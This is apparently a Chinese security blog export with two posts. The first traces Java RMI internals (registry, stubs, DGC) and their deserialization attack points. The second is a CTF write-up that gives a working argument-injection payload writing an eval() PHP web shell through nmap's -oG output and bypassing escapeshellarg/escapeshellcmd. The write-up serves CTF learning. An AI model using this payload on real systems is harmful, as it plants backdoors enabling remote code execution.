<h2 id="RMI流程分析"><a href="#RMI流程分析" class="headerlink" title="RMI流程分析"></a>RMI流程分析</h2><h3 id="RMI创建远程服务"><a href="#RMI创建远程服务" class="headerlink" title="RMI创建远程服务"></a>RMI创建远程服务</h3><p><a href="https://xz.aliyun.com/t/9261">https://xz.aliyun.com/t/9261</a>这个链接偷了一张图<br><img src="/./../images/RMI/3.png" alt="image.png"><br>服务端有注册中心，是一个hash表，用来存储名字和远程对象。<br>客户端是连接注册中心，获取名字来调用远程对象。<br>客户端和服务端并不是直接进行交互的，而是利用了代理。服务端的代理叫做Skeleton，客户端的代理叫做Stub<br>用代理的目的是为了把不属于业务的东西提取出来。<br>产生漏洞的地方肯定是在交互过程中发生的，但是出问题的是在哪部分呢？从图中可以看到有六部分，为了寻找问题到底是出在哪部分，我们从服务端的创建开始逐个分析。<br>我们从下面这段代码开始调试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>开始分析创建远程对象的这个流程，因为这个流程是把服务发布到网上，我们一步一步来看它是如何发布的。<br>在图示地方下断点：<br><img src="/./../images/RMI/4.png" alt="image.png"><br>下一步走到构造函数：<br><img src="/./../images/RMI/5.png" alt="image.png"><br>如何再下一步走到UnicastRemoteObject的构造函数：<br><img src="/./../images/RMI/6.png" alt="image.png"><br>同时注意到此时的port是0，这里的0就是代表随机值。因为这里是把服务发布到网络上（如果对端口有疑惑为什么不是1099的要注意区分注册中心和服务端口的区别），所以不可能每种服务固定一个端口，这样子一旦服务过多端口会不够用的。<br>下一步我们跟到调用exportObject这个地方：<br><img src="/./../images/RMI/7.png" alt="image.png"><br>根据英文意思这里就是发布对象的感觉，这是一个静态函数，而且也是关键语句。因此我们在RemoteObjImpl这个类中也可以不继承UnicastRemoteObject这个类，直接在构造函数中调用这个静态方法也可以。<br>这个obj是我们要实现的真正逻辑，后面的new UnicastServerRef是用于处理网络请求的，可以注意到这里只传了port进去，因此ip是他可以自动获取到的。<br>下一步：<br><img src="/./../images/RMI/8.png" alt="image.png"><br>可以看见新建了一个类LiveRef，我们跟进<br><img src="/./../images/RMI/9.png" alt="image.png"><br>传进去的是一个ID和一个port，ID就是理解成给个编号吧，port就是之前的默认0端口<br>然后我们ID就不看了，直接跟进他的构造函数：<br><img src="/./../images/RMI/10.png" alt="image.png"><br>然后可以看到<br>第一个参数是ID<br>第二个参数是TCPEndpointD的一个静态函数<br>第三个参数true</p>
<p>我们这里只看第二个参数<br><img src="/./../images/RMI/11.png" alt="image.png"><br>可以看到他的里面是返回类型为TCPEndpoint的一个东西，再看一下TCPEndpoint的构造函数：<br><img src="/./../images/RMI/12.png" alt="image.png"><br>发现这里他要接受两个参数，host和port。可以感受到这个东西就是一个处理网络请求的东西</p>
<p>我们再看一下LiveRef的构造函数：<br><img src="/./../images/RMI/13.png" alt="image.png"><br>接收三个参数，ID，Endpoint，isLocal<br>其他都好理解，主要就是这个Endpoint是什么，我们看一下它里面有什么东西：<br><img src="/./../images/RMI/14.png" alt="image.png"><br>发现这里host已经被获取了<br>但是port还是0，port如何获取我们后面在分析</p>
<p>LiveRef的创建到这里就完成了，我们需要记住LiveRef的ID，并且我们从头到尾只创建了这一个LiveRef<br>再往下走，这里也只进行了赋值：<br><img src="/./../images/RMI/15.png" alt="image.png"></p>
<p>继续往下走：<br><img src="/./../images/RMI/16.png" alt="image.png"><br>这里的UnicastServRef就是刚才赋值的的那个东西，只不过包装了而已，而且这也进行了赋值<br>然后继续往下走到sref.exportObject，继续对sref“exportObject”<br><img src="/./../images/RMI/17.png" alt="image.png"><br>但是我们发现这里创建了代理stub</p>
<h4 id="stub明明是客户端的代理，为什么要在服务端创建"><a href="#stub明明是客户端的代理，为什么要在服务端创建" class="headerlink" title="stub明明是客户端的代理，为什么要在服务端创建"></a>stub明明是客户端的代理，为什么要在服务端创建</h4><p>因为需要现在服务端创建完这个代理放在注册中心，客户端再到注册中心去使用这个stub进行操作</p>
<p>我们往下看一下这个stub是怎么创建的<br>第一步是创建一个远程对象类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; remoteClass;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            remoteClass = getRemoteClass(implClass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;object does not implement a remote interface: &quot;</span> +</span><br><span class="line">                implClass.getName());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>第二步是判断：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">forceStubUse ||!(ignoreStubClasses || !stubClassExists(remoteClass))</span><br><span class="line"></span><br><span class="line">forceStubUse 表示当不存在时是否抛出异常</span><br><span class="line">是否存在以 _Stub 结尾的类。remoteClass + <span class="string">&quot;_Stub&quot;</span> </span><br></pre></td></tr></table></figure>
<p>stubClassExists的具体逻辑是这样的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                              <span class="literal">false</span>,</span><br><span class="line">                              remoteClass.getClassLoader());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">                withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>第三步就是创建动态代理了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Remote&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Remote <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> (Remote) Proxy.newProxyInstance(loader,</span><br><span class="line">                                                           interfaces,</span><br><span class="line">                                                           handler);</span><br><span class="line">                &#125;&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;unable to create proxy&quot;</span>, e);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>


<p>创建完stub，就是收尾工作，这里创建了一个Target<br><img src="/./../images/RMI/18.png" alt="image.png"><br>把我们之前创建的所有东西全都放在这里<br>创建完Target就进行ref.exportObject(target)<br>就是对这个target进行发布<br><img src="/./../images/RMI/19.png" alt="image.png"><br>我们可以看见这个ep里面有TCPTransport，所以当我们执行transport.exportObject(target)的时候会对TCPTransport进行exportObject：<br><img src="/./../images/RMI/20.png" alt="image.png"><br>我们跟进到listen里面：<br><img src="/./../images/RMI/21.png" alt="image.png"><br>可以发现这里创建了一个Socket等待别人连接，并且使用了t.start()创建一个新的线程。<br>此时已经成功把服务发布到网络上面了，但是客户端并不知道，注册中心也不知道，所以他自己需要先记录一下这个发布的服务<br>在ObjectTable中执行了这么两行代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">objTable.put(oe, target);</span><br><span class="line">implTable.put(weakImpl, target);</span><br></pre></td></tr></table></figure>
<p>发现这里是用Map来记录的，并且把刚才创建的target当作值。同时这里还是一个静态表</p>
<p>上面的流程我们分析了服务端创建远程服务，接下来我们来看如何创建注册中心、创建的服务如何和注册中心绑定</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>注册中心的创建和远程服务的发布其实是没有关系的，他们之间并不在乎谁先谁后。因为<strong>发布远程服务和注册中心的创建他们本质上都是一样的</strong>，都是把某个服务发布到某个端口上，只不过注册中心通常是固定在1099端口，而服务则是随机发布到某一个端口上。<br>注册中心的创建和发布远程对象本质是一样的我们在下面的代码分析中也会提到。<br>所以这段代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方式一</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        Registry registry= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteObj&quot;</span>, remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//方式二</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        Registry registry= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteObj&quot;</span>, remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这两种代码怎么写都不影响结果，但是我们为了逻辑更合理通常都是利用方式二来写。</p>
<h2 id="创建注册中心："><a href="#创建注册中心：" class="headerlink" title="创建注册中心："></a>创建注册中心：</h2><p>在 <strong>Registry registry&#x3D; LocateRegistry.createRegistry(1099);</strong> 处下断点，我们开始调试代码。<br><img src="/./../images/RMI/22.png" alt="image.png"><br>首先是进入了静态方法createRegisty，并且传入了port1099.<br>然后这里new了一个RegistryImpl，我们就顺势走到RegistryImpl的构造方法：<br><img src="/./../images/RMI/23.png" alt="image.png"><br>重点看下面的new一个LiveRef，然后又new了一个UnicastServRef，并且把LiveRef放在里面，之后调用了setup。<br>看到这里可能有点懵逼，我们上面不是提到创建注册中心和发布远程服务本质上是相同的嘛，我们可以回顾一下发布远程服务的流程：<br><img src="/./../images/RMI/24.png" alt="image.png"><br>那我们在来看看创建注册中心的流程，前三步是不是都和发布远程对象一样的步骤，就是第四步执行了exportObject目前还没有体现，我们跟进到setup函数里面：<br><img src="/./../images/RMI/25.png" alt="image.png"><br>其实也是调用了<strong>UnicastServerRef.exportObject</strong>了。这样看来，其实发布远程对象和创建注册中心本质上就是一样的了，他们都执行了一样的步骤。<br>唯一的区别就是调用时第三个参数permanent不一样，其实就是代表一个是永久，而另一个是非永久罢了。</p>
<p>接下来我们继续跟进到exportObject函数里面：<br><img src="/./../images/RMI/26.png" alt="image.png"><br>到目前为止和我们之前调试发布远程对象都一样，但是我们跟进到createProxy里面就开始有区别了<br><img src="/./../images/RMI/27.png" alt="image.png"><br>因为这里会执行一个stubClassExists，这个函数的代码逻辑如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                              <span class="literal">false</span>,</span><br><span class="line">                              remoteClass.getClassLoader());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">                withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//功能就是判断JDK中是否有以xxx_Stub的类，有的话就加载</span></span><br></pre></td></tr></table></figure>
<p><img src="/./../images/RMI/28.png" alt="image.png"><br>于是就会进入这个类中把他加载出来，具体的加载逻辑是这样的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	Class&lt;?&gt; stubcl = Class.forName(stubname, <span class="literal">false</span>, remoteClass.getClassLoader());</span><br><span class="line">    Constructor&lt;?&gt; cons = stubcl.getConstructor(stubConsParamTypes);</span><br><span class="line">    <span class="keyword">return</span> (RemoteStub) cons.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; ref &#125;);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这里利用反射forName获取类名，然后利用构造器进行实例化加载这个类</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">这里和服务端的区别就是：服务端是利用动态代理创建出来的，而注册中心是利用JDK自由的类反射创建出来的</span><br></pre></td></tr></table></figure>
<p>接着往下走<br><img src="/./../images/RMI/29.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) <span class="comment">//这一步就是判断stub是否是服务端定义好的</span></span><br><span class="line">&#123;</span><br><span class="line">     setSkeleton(impl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因为这里的stub确实是服务端已经定义好的，于是我们跟进到setSkeleton里面：<br><img src="/./../images/RMI/30.png" alt="image.png"><br>再跟到createSkeleton<br><img src="/./../images/RMI/31.png" alt="image.png"><br>发现这里和上面创建stub一样也是直接利用反射获取JDK的类名来实例化这个类<br>出来之后就是创建target，然后发布到网络上，和发布远程对象一样的。<br>就是这里tartget里面有三个值得注意的东西，就是objTable里面<br>第一个：RegistryImpl<br><img src="/./../images/RMI/32.png" alt="image.png"><br>第二个：DGC（分布式垃圾回收）<br><img src="/./../images/RMI/33.png" alt="image.png"><br>第三个：远程服务<br>可以注意到远程服务的stub类型是动态代理创建的类型为**$Proxy0**<br><img src="/./../images/RMI/34.png" alt="image.png"></p>
<h2 id="注册绑定"><a href="#注册绑定" class="headerlink" title="注册绑定"></a>注册绑定</h2><p>我们直接下bind的断点跟进：<br><img src="/./../images/RMI/35.png" alt="image.png"><br>这个checkAccess就是判断是否本地绑定<br><img src="/./../images/RMI/36.png" alt="image.png"><br>然后上面那个判断就是判断这个name是否绑定过，没绑定过就put呗<br>这个bingdings本质上就是一个HashTable，然后把远程对象绑定进去，就是这么简单</p>
<p>服务端的分析到这里告一段落，接下来我们分析客户端</p>
<h2 id="客户端请求注册中心"><a href="#客户端请求注册中心" class="headerlink" title="客户端请求注册中心"></a>客户端请求注册中心</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">hello</span> <span class="operator">=</span> remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们在第十行下断点，我们可以发现他的流程和服务端的一样：<br><img src="/./../images/RMI/37.png" alt="image.png"><br>都是重新createProxy，然后利用forName来加载类<br>执行完后我们可以看到：<br><img src="/./../images/RMI/38.png" alt="image.png"><br>这里就是获取注册中心的stub对象，下一步就是通过名字来获取远程对象<br>我们往下看lookup<br><img src="/./../images/RMI/39.png" alt="image.png"><br>下面那个newCall就是创建一个连接<br>然后有一个writeObject(var1),这个var1就是我们传进来的字符串。我们发现了他被序列化了，到时候注册中心就会反序列化读取他</p>
<p>再往下就是重点invoke方法<br><img src="/./../images/RMI/40.png" alt="image.png"><br><code>invoke</code>方法会调用<code>executeCall()</code>方法<br><code>executeCall()</code>方法中的捕获异常中有一个readObject：<br><img src="/./../images/RMI/41.png" alt="image.png"><br>在这里如果服务端是一个恶意的类被服务端加载的话，就可以达到攻击客户端的目的</p>
<p>执行完invoke下面还有一个攻击客户端的利用点：<br><img src="/./../images/RMI/42.png" alt="image.png"><br>因为这里客户端获取服务端的远程对象的过程是通过反序列化读取他的，那么如果服务端是恶意的反序列反参数就可以攻击客户端</p>
<p>但是这两个反序列的攻击点还是invoke进去的executeCall()这里更加隐蔽，更加常用到。因为很多函数都会调用invoke方法。如bind()，list()<br><img src="/./../images/RMI/43.png" alt="image.png"><br><img src="/./../images/RMI/44.png" alt="image.png"></p>
<h2 id="客户端请求服务端"><a href="#客户端请求服务端" class="headerlink" title="客户端请求服务端"></a>客户端请求服务端</h2><p>我们从<code>remoteObj.sayHello</code>开始调试<br>发现我们调试第一步就直接进入了invoke<br><img src="/./../images/RMI/45.png" alt="image.png"><br>因为这里remoteObj是一个动态代理，所以调用方法的时候就会直接进入invoke。<br>我们从invokeRemoteMethod进入<br>然后跟进invoke：<br><img src="/./../images/RMI/46.png" alt="image.png"><br>之后的走到marshaValue函数，这个函数就是判断是否是基本类型，不是的话就序列化<br><img src="/./../images/RMI/47.png" alt="image.png"><br>再往下，发现执行了<code>call.executeCall()</code><br>其实不管是用户自定义的stub还是系统定义的stub都会调用这个方法，<code>executeCall()</code>是处理网络请求的东西东西，这里也有可能被攻击。因为<code>executeCall()</code>处理走的是JRMP协议，所以通过JRMP进行攻击就是通过RMI自定义的客户端协议进行攻击，攻击的是stub。可以是客户端攻击服务端，也可以是服务端攻击客户端，不过还没有研究。</p>
<p>再往下走，如果调用的远程函数有返回值的话会执行<code>unmarshalValue</code>，并且获取远程返回值是利用反序列化读出来的</p>
<h2 id="DGC的分析"><a href="#DGC的分析" class="headerlink" title="DGC的分析"></a>DGC的分析</h2><p>DGC会在创建远程服务的时候就自动创建DGC服务，我们来关注DGC服务是在何时、何处产生的。<br>我们定位到：<code>putTarget()</code>,这个函数就是在众多七七八八的都创建完之后执行的，把一些东西放在静态表里面，我们可以注意到在<code>putTarget()</code>中，有一个<code>DGCImpl.dgcLog.isLoggable</code><br><img src="/./../images/RMI/48.png" alt="image.png"><br>DGC服务就是在这里创建的，这里是调用了DGCImpl类的静态函数，在类的动态加载中我们提到只要调用了类的静态函数就对这个类进行了初始化，因此会执行类的<code>static静态代码块</code><br><img src="/./../images/RMI/49.png" alt="image.png"><br>在DGCImpl的静态代码块里面的try里执行了<code>new DGCImpl()</code>,再往下看一下stub是怎么创建的，其实原理和我们之前分析服务端的skel和客户端的stub一样，看一下JDK是否有<code>DGCImpl_Stub</code>这个类，有则反射创建。</p>
<p>在<code>DGCImpl_Stub</code>类中有两个方法，<code>clean</code>和<code>dirty</code>。这两个函数都有我们之前说过比较危险的地方：readObject和invoke<br><img src="/./../images/RMI/50.png" alt="image.png"><br><img src="/./../images/RMI/51.png" alt="image.png"><br>因此存在被攻击的风险。<br><code>DGCImpl_Skel</code>也是同理，也存在危险的地方<br><img src="/./../images/RMI/52.png" alt="image.png"><br><img src="/./../images/RMI/53.png" alt="image.png"><br>因此服务端和客户端都存在被攻击的风险。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>2020年朱雀杯-Nmap</title>
    <url>/2022/08/24/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap%20wp/</url>
    <content><![CDATA[<h2 id="深层次剖析！！！"><a href="#深层次剖析！！！" class="headerlink" title="深层次剖析！！！"></a>深层次剖析！！！</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>[2020年朱雀杯]</strong> 和 <strong>[BUUCTF 2018]Online Tool</strong>的题目似乎是一样的，不同在于朱雀杯没有给出源码，主要考察的都是<strong>nmap一句话木马写入</strong>。本篇文章细致讲解输入时<strong>escapeshellarg</strong>和<strong>escapeshellcmd</strong> 两个函数所进行的步骤。</p>
<span id="more"></span>
<h2 id="知识巩固"><a href="#知识巩固" class="headerlink" title="知识巩固"></a>知识巩固</h2><p>关于nmap的输出命令：<br>翻阅nmap中文手册，发现主要只有四种：</p>
<ul>
<li>-oN &lt; filespec &gt; (标准输出)</li>
<li>-oX &lt; filespec&gt;  (XML输出)   </li>
<li>-oS &lt; filespec&gt; (ScRipT KIdd|3 oUTpuT)   </li>
<li>-oG &lt; filespec&gt; (Grep输出)</li>
</ul>
<p>其中主要就是 <strong>-oN</strong> 和 <strong>-oG</strong> 为主，我们看一下他们的区别：（本地测试一下）<br><img src="https://img-blog.csdnimg.cn/588acbd1f44b4b0a893de95ec3d63ed8.png" alt="点我可以放大哦"><br>不难发现两件事：</p>
<ol>
<li>我们可以构造任意文件内容</li>
<li>文件的名字，<strong>包括后缀</strong>也是我们自己定义</li>
</ol>
<p> 接下来我们来研究一个有意思的东西：<br> 如果使用nmap写入一句话木马不用引号包起来会怎么样：<img src="https://img-blog.csdnimg.cn/566a0f0f33aa462d890f370342c48491.png" alt="点我可以放大哦"><br> 直接输入的话是无法生成文件的，必须给<?= @ eval($_REQUEST[1]);?>引号包起来才能正确执行命令，除此之外还有什么办法能执行呢。</p>
<p>！！ <em><strong>\转义</strong></em> ！！<br>！！ <em><strong>\转义</strong></em> ！！<br>！！ <em><strong>\转义</strong></em> ！！</p>
<p><img src="https://img-blog.csdnimg.cn/1ea9296240844d17a9793414b7e3b216.png" alt="点我可以放大哦"><br>把这些会引起歧义的符号全部转义就能执行命令，并且将木马生成在php文件中。这将对绕过 escapeshellarg 和 escapeshellcmd 很有用</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>进入页面，先输入<strong>127.0.0.1</strong>看一下会怎么样<br><img src="https://img-blog.csdnimg.cn/cd02b149cba94d789e7d0163b691f6e1.png" alt="点我可以放大哦"></p>
<p>发现结果和我们本地非常相似：<br><img src="https://img-blog.csdnimg.cn/05fbc74f4f4b42aba269d021bf05bca4.png" alt="点我可以放大哦"><br>再尝试一下命令：</p>
<blockquote>
<p>127.0.0.1 | ls</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/f4f028a8374e4ddcab71596dcb58aa2c.png" alt="点我可以放大哦"></p>
<p>可以看到本地是可以执行的，那我们试一下题目环境<br><img src="https://img-blog.csdnimg.cn/0872a3806bf741f58f89c299af601aaa.png" alt="点我可以放大哦"><br>发现被转义了<br></br><br></br><br>只能另辟蹊径，我们直接试着写入一句话木马</p>
<p><code> &#39;&lt;?php eval($_GET[1])?&gt;&#39; -oN 1.php</code></p>
<p><img src="https://img-blog.csdnimg.cn/a6fefabb78a245a78c76a63ad2148f1a.png" alt="点我可以放大哦"><br>结果发现回显是Hacker，可能把php过滤了</p>
<h3 id="过滤php怎么办"><a href="#过滤php怎么办" class="headerlink" title="过滤php怎么办"></a>过滤php怎么办</h3><blockquote>
<p>1.在一句话木马中的解决办法<br> </br><br> </br><br>利用短标签：<?=eval($_GET[1])?></p>
</blockquote>
<blockquote>
<p>后缀为php的解决办法<br></br><br></br><br>后缀改为phtml，也会解析成php文件</p>
</blockquote>
<p>接下来再试着写入一句话木马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])<span class="meta">?&gt;</span> -oN <span class="number">1</span>.phtml</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/896e6b725a334c98959897ba77307385.png" alt="点我可以放大哦"><br>回显是这个，但是我们访问1.phtml，发现并没有生成，是函数<strong>escapeshellarg</strong>和<strong>escapeshellcmd</strong>在作怪。</p>
<h3 id="如何绕过escapeshellarg和escapeshellcmd"><a href="#如何绕过escapeshellarg和escapeshellcmd" class="headerlink" title="如何绕过escapeshellarg和escapeshellcmd"></a>如何绕过<strong>escapeshellarg</strong>和<strong>escapeshellcmd</strong></h3><p>要了解如何绕过，那就得先了解一下这两个函数的分别作用<br><img src="https://img-blog.csdnimg.cn/6f1936ae35ee45b891089e6bdcb31597.png" alt="点我可以放大哦"></p>
<p><img src="https://img-blog.csdnimg.cn/a91c3e1a83e84661ac884f52b80214c9.png" alt="点我可以放大哦"><br>看了描述之后再看一下这两个函数的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;&#x27; &lt;?= @eval(\$_REQUEST[1]);?&gt; -oG test.phtml &#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;escapeshellarg:&quot;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$a</span>).<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;escapeshellcmd:&quot;</span>.<span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$a</span>).<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellarg:<span class="string">&#x27;&#x27;</span>\\<span class="string">&#x27;&#x27;</span><span class="meta">&lt;?=</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span> -oG test.phtml<span class="string">&#x27;\\&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">escapeshellcmd:<span class="string">&#x27;&#x27;</span>\\\\<span class="string">&#x27;&#x27;</span>\&lt;\\?= @<span class="keyword">eval</span>\\(\\<span class="variable">$_REQUEST</span>\\[<span class="number">1</span>\\]\\)\\;\\?\\&gt; -oG test.phtml<span class="string">&#x27;\\\\&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果我们把两个函数处理过的字符串直接用nmap尝试写入文件能成功吗<br><img src="https://img-blog.csdnimg.cn/e6272a79439847e0a0f6d21513b9522f.png" alt="点我可以放大哦"><br>很显然，答案是可行的如此一来便绕过了<strong>escapeshellarg</strong>和<strong>escapeshellcmd</strong></p>
<p>接下来就是连接木马巴拉巴拉<br><img src="https://img-blog.csdnimg.cn/80ecfef12a42466780ba008f01e3ba80.png" alt="点我可以放大哦"></p>
<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>exp：</p>
<p><code> &#39; &lt;?= @eval($_REQUEST[1]);?&gt; -oG test.phtml &#39;</code></p>
<p>这个<strong>引号</strong>和 <strong>&lt;</strong> 之间要记得留空格，否则 <strong>&lt;</strong> 会被转义，一句话木马就失效了</p>
